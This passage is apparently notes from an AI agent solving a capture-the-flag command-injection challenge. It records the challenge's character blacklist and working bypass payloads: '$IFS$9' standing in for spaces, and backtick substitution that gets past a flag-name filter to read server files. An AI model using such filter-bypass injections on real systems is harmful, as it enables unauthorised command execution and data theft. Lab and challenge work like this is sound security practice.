  -c 4 ".$ip)`. Blacklist: `& / ? * < > '' " \ ( ) [ ] { }` and `\x00-\x1f`, literal
  space, `bash`, and regex `.*f.*l.*a.*g.*`.'
- '[claude] Working space substitute: `$IFS$9` (e.g. `?ip=127.0.0.1;cat$IFS$9index.php`
  dumps source). `$IFS` alone also works; tab newline `<` quotes and `;`-adjacent
  symbol chars are blocked.'
- '[claude] Flag filter bypass: `?ip=127.0.0.1;cat$IFS\`ls\`` — backtick command substitution
  is permitted; `ls` word-splits into `flag.php index.php`, so `cat` reads both. Output
  contained `$flag = "CTF2{b0f9383'
